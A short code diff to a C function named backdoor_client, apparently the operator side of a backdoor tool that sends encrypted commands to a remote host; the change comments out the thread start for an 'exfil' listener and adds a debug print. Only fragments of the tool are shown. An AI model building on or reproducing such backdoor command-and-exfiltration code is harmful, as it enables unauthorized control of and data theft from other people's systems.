@@ -43,8 +43,7 @@ void backdoor_client(uint32 ipaddr, int dport, int duplex)
 	}
 
 	// exfil thread
-	pthread_create(&exfil_thread, NULL, exfil_listen, &saddr);
-	
+	//pthread_create(&exfil_thread, NULL, exfil_listen, &saddr);
 
 	printf("Ready, awaiting your command...\n");
 	while(fgets(command, MAX_LEN, stdin) != NULL)
@@ -77,6 +76,8 @@ void backdoor_client(uint32 ipaddr, int dport, int duplex)
 		sendto(sock, buff, len, 0, (struct sockaddr *)&saddr, sizeof(saddr));
 
 		free(enc);
+
+		printf("ABCAS\n");
 	}	
 
 	// Listen thread cleanup
